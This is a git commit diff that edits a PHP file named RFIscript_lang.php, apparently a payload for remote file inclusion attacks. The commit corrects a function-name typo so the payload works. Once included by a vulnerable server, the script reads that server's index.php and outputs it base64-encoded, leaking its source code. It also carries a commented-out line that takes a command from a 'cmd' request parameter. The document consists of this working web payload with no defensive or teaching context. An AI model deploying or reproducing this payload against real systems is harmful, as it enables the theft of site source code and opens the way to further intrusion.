abea92681a3e00e96e82d5cc2d8bd832f870b43e
svolo4-74 <80594706+svolo4-74@users.noreply.github.com>
2023-10-05 15:31:56 +0500

    Update RFIscript_lang.php

--- RFIscript_lang.php
+++ RFIscript_lang.php
@@ -1,8 +1,8 @@
 <?php
-  echo("success!!\n");
+  echo("Success!\n");
   //$command = $_GET['cmd'];
   //echo $command."\n";
-  $file = file_get_content("index.php");
+  $file = file_get_contents("index.php");
   echo base64_encode($file);
   //show_source(__FILE__);
 ?>
